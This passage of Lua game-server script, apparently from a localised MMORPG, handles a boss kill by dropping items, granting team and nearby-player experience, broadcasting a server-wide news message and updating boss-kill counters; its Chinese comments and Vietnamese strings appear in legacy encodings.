	tbDropTemplet:GiveAwardByList(nNpcIndex, PlayerIndex,%tbVnNewItemDropAward,format("killed_%s",GetNpcName(nNpcIndex)))	
	-- ÎäÁÖÈÙÓþÁîÅÆµôÂä
	if (GetProductRegion() == "cn" or GetProductRegion() == "cn_ib") then
		local szNpcName = GetNpcName(nNpcIndex);
		if (DROPRATE_BOSS_HONOURRATE[szNpcName]) then
			for i = 1, getn(DROPRATE_BOSS_HONOURRATE[szNpcName]) do
				local nrate = random(1, 10000);
				if (nrate < DROPRATE_BOSS_HONOURRATE[szNpcName][i]) then
				DropItem(world, x, y, PlayerIndex, 6, 1, HONOURID[i], 1, 0, 0, 0, 0, 0, 0, 0, 0);
				end;
			end;
		end;
	end;
	
	-- ¸øÉ±µôBOSSµÄÈË»ò¶ÓÎé½±Àø
	local nTeamSize = GetTeamSize();
	local szName;
	
	if (nTeamSize > 1) then
		for i=1,nTeamSize do
			if(doFunByPlayer(GetTeamMember(i), IsCaptain)==1)then
				szName = doFunByPlayer(GetTeamMember(i), GetName);
			end
			doFunByPlayer(GetTeamMember(i), PlayerFunLib.AddExp, PlayerFunLib, KILLBOSSEXPAWARD, 0, format("%s phÇn th­ëng","Kinh nghiÖm ®¶ b¹i BOSS hoµng kim"));
		end
	else -- Ò»¸öÈË
		szName = GetName();
		PlayerFunLib:AddExp(KILLBOSSEXPAWARD, 0, format("%s phÇn th­ëng","Kinh nghiÖm ®¶ b¹i BOSS hoµng kim"));
	end
	
	local tbRoundPlayer, nCount = GetNpcAroundPlayerList(nNpcIndex, 20);
	
	for i=1,nCount do
		doFunByPlayer(tbRoundPlayer[i], PlayerFunLib.AddExp, PlayerFunLib, KILLBOSSNEAREXPAWARD, 0, format("%s phÇn th­ëng","Kinh nghiÖm ®øng gÇn lóc BOSS hoµng kim bÞ tiªu diÖt"));
	end
	
	local szNews = format("<pic=77> <color=cyan>%s<color> t¹i <color=yellow>%s<color> ®· tiªu diÖt thµnh c«ng <color=green>%s <pic=48><pic=108>", szName, SubWorldName(SubWorld),GetNpcName(nNpcIndex));
	AddGlobalNews(szNews);
	LG_ApplyDoScript(1, "", "", "\\script\\event\\msg2allworld.lua", "battle_msg2allworld", szNews , "", "");
	
	-- BOSS»÷É±Í³¼Æ
	local nCount = GetTask(TSK_PLAYER_BOSSKILLED);
	nCount = nCount + 1;
	SetTask(TSK_PLAYER_BOSSKILLED, nCount);
	
	if (GetNpcParam(nNpcIndex, 1) == 1) then --19:30µÄ»Æ½ðBOSS
		-- »Æ½ðBOSS¼ÆÊý
		RemoteExecute("\\script\\mission\\boss\\bigboss.lua", "ReduceGoldBossCount", 0);
	end
end;

